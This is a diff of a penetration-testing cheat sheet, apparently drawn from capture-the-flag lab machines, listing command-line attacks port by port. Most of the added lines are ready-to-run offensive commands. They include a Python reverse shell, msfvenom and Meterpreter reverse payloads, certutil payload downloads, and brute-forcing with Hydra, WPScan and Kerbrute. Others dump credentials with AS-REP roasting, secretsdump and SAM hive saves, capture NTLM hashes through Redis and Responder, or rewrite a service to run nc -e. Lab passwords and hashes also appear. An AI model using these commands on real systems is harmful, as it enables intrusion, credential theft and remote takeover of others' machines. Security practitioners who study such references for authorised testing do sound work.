@@ -4,6 +4,7 @@ Use this knowledge for good reasons!
 
 
 --- ORGANIZATION ---
+
 ### FOLDER STRUCTURE ###
 mkdir target && cd target && mkdir enum content exploits
 
@@ -21,18 +22,27 @@ arp-scan --localnet
 ping -c4 <IP>
 
 ### Port Enumeration ###
+nmap -sS -p- --open --min-rate 5000 -n -Pn <IP>
 nmap -sCV -p- --open <IP> -oN ports.txt
+sudo nmap -p- --open -sS -sCV -n -Pn 10.10.10.245 -vv -oN nmap
 
 ### Web Application Enumeration ###
 whatweb <IP> >> whatweb.txt | webanalyze - host http://example.com - crawl 2
 
 ### Web Directory Enumeration ###
 diresearch -u <URL> -e* -x 404 -w /wordlist -o dirsearch.txt
+dirb <URL>
+feroxbuster -u http://example.htb
 
 ### Subdomain Enumeration ### (Check crt.sh)
 ffuf -c -u <URL> -H "Host: FUZZ.example.com" -w /Discovery/DNS/subdomains -ac -mc -all
 wfuzz -c -w /Discovery/DNS/subdomains --hc 404 -h "Host: FUZZ.example.com" -u http://example.com -t 100
 subfinder -d example.com --all --recursive -o subfinder.txt && subfinder -d example.com | httpx -o AliveSubs.txt | nuclei
+gobuster dns -d example.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50        
+
+### Vhost Enumeration ###
+ffuf -w ./wordlist.txt -H "Host: FUZZ.example.com" -u <URL> -fc 302
+gobuster vhost -u http://example.htb/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --append-domain -r
 
 ### Active Directory Enumeration ###
 gobuster dns -d domain.local -t 25 -w /Discovery/DNS/subdomain
@@ -43,6 +53,19 @@ echo "<IP> example.com sub.example.com" >> /etc/hosts
 ### Exploit Enumeration ###
 searchsploit <service> -m /path/example.py (copy the exploit) -x (inspect exploit)
 
+### File Enumeration ###
+find / -name whatever 2> /dev/null | find / -type f -name user.txt 2> /dev/null
+grep -Ril "text-to-find-here" /
+
+### Extract Mails from File ###
+grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" >> /path/mails.txt
+
+### Extract Users from Mail ###
+cut -d@ -f1
+
+### Remove Duplicated Lines form File ###
+awk '!seen[$0]++' filename.txt
+
 
 
 --- PORTS ---
@@ -52,36 +75,47 @@ ftp <IP> anonymous
 hydra -l root -P pass.txt <IP> ftp
 wget -m ftp://user:pass@IP | wget -r --user="usr" --password="pswd" ftp://server.com/
 
-### 22 (SSH) ###
-ssh user@IP /bin/bash | ssh -p <PORT> <IP> | ssh -t user@<IP> bash
+### 22 (SSH) ### 
+ssh2john id_rsa > sshkeyshash.txt -> john --wordlist=/path/rockyou.txt sshkeyshash.txt
+chmod 600 id_rsa
+ssh -i id_rsa user@ip (If you find id_rsa on a machine (/home/user/.shh/id_rsa), you can execute it on the machine itself) | ssh user@IP /bin/bash | ssh -p <PORT> <IP> | ssh -t user@<IP> bash
 msf> use scanner/ssh/ssh_enumusers
 crackmapexec ssh --help
+hydra -l user -P passwords.txt IP_VICTIM ssh
 
 ### 25, 465, 587 (SMTP) ###
 nmap --script smtp-enum-users <IP>
 
 ### 80, 443 (HTTP) ###
-cewl example.com -m 5 creds.txt
+wapiti -u http://example.com -v 2 (in order to avoid IP blocks, use with proxychains)
+cewl --lowercase -w wordlist.txt <url>
 hydra -L /wordlists/users.txt -P /wordlists/password.txt example.com http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 nuclei -ut && nuclei -target <URL> -t /template
 cmsmap -F -d <URL> | cmsmap -f W/J/D/M -u a -p a http://example.com
 GET: sqlmap -u "<URL>" -p "<PARAM_TO_TEST>" | POST: sqlmap -u "<URL>" --data "username=*&password=*"
-wpscan --force update -e --url <URL>
+sqlmap -r Burp_Request.txt -p username --dump
+wpscan --force update -e --url <URL> | wpscan --url 10.10.62.25 --passwords fsocity.dic --usernames Elliot -t 35 (Pass BruteForce) -> hydra -L fsocity.dic -p 123453453 {IP} http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username” (User BruteForce)
 joomscan --ec -u <URL>
 sslscan <host:port>
 droopescan scan drupal -u https://example.com -t 32
 
 ### 88 (Kerberos) ###
 msf> use auxiliary/gather/kerberos_enumusers
-python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
+kerbrute -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
+./kerbrute_linux_amd64 userenum -d spooky.local --dc 10.10.227.175 userlist.txt -o kerb_users.txt
+kerbrute userenum --dc dc01.jab.htb -d jab.htb -v /opt/usernames/jsmith.txt --hash-file NP.txt | tee kerbrute.out
+cat kerbrute.out | grep '+' | awk '{print $7}' > usernames.txt (filter ONLY valid users)
+impacket-GetNPUsers -dc-ip 10.10.227.175 -usersfile ad_users.txt spookysec.local/
+dcomexec.py -object MMC20 domain/user:"PassWord"@<IP> 'PowerShell#3(Base64)' -silentcommand (in order to abuse this, user must be member of the "Distributed COM Users" -> Check Bloodhound Script)
+hashcat -m 18200 -a 0 svc_admin_hash.txt passwordlist.txt
 
 ### 111 (RPCbind) ###
 rpcinfo -p <IP>
 rpcclient -U "" <IP>
 
 ### 135, 593 (MSRPC) ###
-rpcdump <IP> -p 135 | rpcdump DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 rpcclient -U "" -N <IP>
+rpcdump <IP> -p 135 | rpcdump DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | impacket-rpcdump @TARGET_IP | egrep 'MS-RPRN|MS-PAR'
 
 ### 137, 138, 139 (NetBios) ###
 nmblookup -A <IP>
@@ -89,14 +123,21 @@ nbtscan -r <IP>/24
 
 ### 139, 445 (SMB) ###
 enum4linux -a <IP> | enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>
-smbclient -L \\\\IP\\ | smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
+netexec smb <IP> | netexec smb <IP> -u guest -p ''
+kerbrute userenum --dc 10.10.11.3 -d office.htb /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt
+netexec smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+netexec smb office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
+smbclient "//<IP>/<DIR>" -U 'usr/pwd' | smbclient //<IP>/<dir> | smbclient -L \\\\IP\\ | smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L // | smbclient -U svc-admin //spookysec.local/<share_name> [interactive console, use "more" to cat files]
 smbmap -H <IP> -P <PORT> | smbmap -R <dir> -H <IP> -A <doc.txt> -q | smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>
-crackmapexec smb <IP> -u '' -p '' || crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq || crackmapexec smb <IP> -u users.txt -p passwords.txt || crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
+smbget --recursive -U spookysec.local/svc-admin%management2005 smb://10.10.227.175/backup
+impacket-secretsdump -just-dc spooky.local/backup:backup2517860@10.10.227.175
+crackmapexec smb <IP> -u '' -p '' || crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq || crackmapexec smb <IP> -u users.txt -p passwords.txt --shares || crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
 psexec \\<IP> -u Administartor -p 123456
 msf> use auxiliary/gather/kerberos_enumusers | msf> use auxiliary/scanner/smb/smb_login
 medusa -h 10.11.1.111 -u <usr> -P /Passwords/common.txt -M smbnt
 
 ### 389, 636, 3268, 3269 (LDAP) ###
+nmap <IP> -p389,636 -script discovery
 ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" + | ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" | ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
 nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
@@ -108,7 +149,13 @@ python MultiRelay.py -t <IP> -u ALL -d (Dump Hashes)
 crackmapexec mssql -d <Domain> -u <usr> -p <pwd> -x "whoami" | -H <hash>
 
 ### 3306 (MySQL) ###
-mysql -h <Hostname> -u root@example.com
+mysql -h <Hostname> -u root@example.com | mysql -u <user> -p <>
+show databases;
+use database;
+show tables;
+describe table;
+select username, email, password from table;
+SELECT * FROM table;
 
 ### 3389 (RDP) ###
 hydra -L usernames.txt - p 'pass123' <IP> rdp
@@ -120,6 +167,10 @@ crackmapexec winrm <IP> -d <Domain> -u usernames.txt -p passwords.txt
 evil-winrm -u <username> -p <password> -i <IP>/<Domain> | evil-winrm -u <username> -H <Hash> -i <IP>
 winrs -r:http://bizintel:5446 -u:ta\redsuit -p:2600leet hostname
 
+### 6379 (Redis) ###
+redis-cli -h <IP> -> INFO -> CONFIG GET * -> eval “dofile(‘C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt’)” 0
+responder -I tun0 -> redis-cli -h <IP> eval "dofile('//<tun0>/test')" 0 [get the hash]
+hashcat -m 5600 responder_ntlm_hash /usr/share/wordlists/rockyou.txt
 
 
 --- SHELL --- (Check RevShells.com)
@@ -127,8 +178,24 @@ winrs -r:http://bizintel:5446 -u:ta\redsuit -p:2600leet hostname
 ### Python Shell ###
 python3 -c 'import pty; pty.spawn("/bin/bash")' -> CTRL+Z -> stty raw -echo; fg -> enter x2 -> reset xterm -> export TERM=xterm -> stty rows 38 columns 116
 
+### Python Reverse Shell ###
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
 ### Without Python ###
 echo os.system('/bin/bash') | /bin/sh -i
+
+### RunasCs.exe ### (Execute on User's Desktop)
+.\RunasCs.exe <user> <pwd> cmd.exe -r <IP>:<PORT>
+
+### MSF ###
+msf> use exploit/multi/handler -> set payload system/meterpreter/reverse -> set LHOST -> set LPORT -> run
+
+### msfvenom ###
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR IP LPORT=port -f exe > reverse.exe
+
+### PowerShell ###
+If you are on a 'cmd' terminal, just type: PowerShell
+
 
 
 
@@ -140,6 +207,7 @@ python3 -m http.server <PORT>
 ### Download ###
 wget http://<IP>:<PORT>/
 curl -O http://www.domain.com/file.flv
+certutil -urlcache -f http://<IP>:<PORT>/<file.exe> <file.exe>
 
 
 
@@ -148,12 +216,15 @@ curl -O http://www.domain.com/file.flv
 ### Nmap Without Nmap ###
 for ip in {1..5}; do for port in {21,22,5000,8000,3306}; do (echo >/dev/tcp/172.18.0.$ip/$port) >& /dev/null && echo "172.18.0.$ip port $port is open"; done; done
 
-### Chisel ###
-chisel server --auth "test:123" -p 443 --reverse | chisel server -p 8888 --host 192.168.2.149 --reverse -v
-./chisel client --auth "test:123" 10.10.10.10:443 R:socks | chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80
+### Chisel ### (apt-get install golang)
+git clone chisel -> cd chisel -> go build -> env GOOS=windows GOARCH=amd64 go build -o chisel_win.exe -ldflags "-s -w"
+chisel server --auth "test:123" -p 443 --reverse | chisel server -p 8888 --host 192.168.2.149 --reverse -v | chisel server -p 8050 --reverse
+./chisel client --auth "test:123" 10.10.10.10:443 R:socks | chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80 | ./chisel_win.exe client 10.10.16.23:8050 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091
 
 ### Remote Port Forwarding ###
 ssh -N -R 10.10.1.1:4455:127.0.0.1:445 attacker@10.10.1.1
+ssh -L 8080:localhost:8080 amay@sea.htb
+sudo lsof -i :8080 (check running process on port)
 
 
 
@@ -161,6 +232,20 @@ ssh -N -R 10.10.1.1:4455:127.0.0.1:445 attacker@10.10.1.1
 
 ### Check Binaries ###
 getcap -r / 2>/dev/null
+for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
+for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
+
+### Check Permissions ###
+id (Check for Docker)
+
+### Check Docker ###
+docker image ls
+
+### Check SUID permissions ###
+find / -user root -perm /4000 2>/dev/null
+
+### Check SUID Binaries ###
+find / -user root -perm -u=s 2>/dev/null (Check for '/usr/bin/pkexec')
 
 ### Check Python ###
 which python python2 python3
@@ -168,7 +253,7 @@ which python python2 python3
 ### Check OS ###
 cat /etc/os-release 2>/dev/null
 
-### Check Command Privilages ###
+### Check Command Privilages ### (Check for LD_PRELOAD)
 sudo -l
 
 ### Check Kernel ###
@@ -190,7 +275,7 @@ crontab -l | ls -al /etc/cron* /etc/at* | cat /etc/cron* /etc/at*
 systemctl show-environment
 
 ### Check Open Local Ports ###
-netsat -punta || ss --ntpu | grep "127.0"
+netsat -punta || ss -tl || ss --ntpu | grep "127.0"
 
 ### Check Logged Users ###
 w -> last | tail -> lastlog
@@ -230,7 +315,7 @@ arp -A
 systeminfo
 
 ### Check Open Local Ports ###
-netsat -ano
+netsat -ano | netstat -avn
 
 ### Check List of Computers ###
 net view
@@ -268,6 +353,9 @@ driverquery
 ### Check Permissions of Binaries ###
 dir /a "C:\Program Files" | reg query HKEY_LOCAL_MACHINE\SOFTWARE
 
+### Check Executable Files with Write Permission ###
+find / -maxdepth 3 -type f -executable -perm /222 | grep -r --include=\*.sh ./ 2>/dev/null
+
 ### Check Startup Binaries ###
 wmic startup get caption,command 2>nul & ^
 
@@ -276,6 +364,12 @@ sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\Sy
 
 ### Restart Service ###
 net stop [service name] && net start [service name]
+
+### Dump SAM/SYSTEM/SECURITY ###
+reg.exe save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\sam.save
+reg.exe save hklm\security[C:\xampp\htdocs\oscommerce-2.3.4\security.save
+reg.exe save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\system.save
+impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
 
 
 
